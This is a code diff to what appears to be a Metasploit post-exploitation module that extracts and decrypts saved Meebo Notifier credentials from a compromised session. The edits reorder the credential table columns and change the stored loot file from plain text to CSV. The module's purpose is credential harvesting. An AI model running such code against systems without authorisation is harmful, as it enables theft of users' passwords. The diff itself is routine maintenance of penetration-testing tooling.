@@ -54,9 +54,9 @@ class Metasploit3 < Msf::Post
 				'Ident'	=> 1,
 				'Columns' =>
 				[
-						'Protocol',
-						'User',
-						'Password'
+					'User',
+					'Password',
+					'Protocol'
 				]
 			)
 
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Post
 
 			passwd = decrypt(epass)
 			print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
-			creds << [protocol, username, passwd]
+			creds << [username, passwd, protocol]
 			config.close
 
 			if passwd == nil or username == nil
@@ -92,10 +92,10 @@ class Metasploit3 < Msf::Post
 				print_status("Storing data...")
 				path = store_loot(
 					'meebo.user.creds',
-					'text/plain',
+					'text/csv',
 					session,
-					creds,
-					'meebo_user_creds.txt',
+					creds.to_csv,
+					'meebo_user_creds.csv',
 					'Meebo Notifier User Credentials'
 				)
 				print_status("Meebo Notifier user credentials saved in: #{path}")
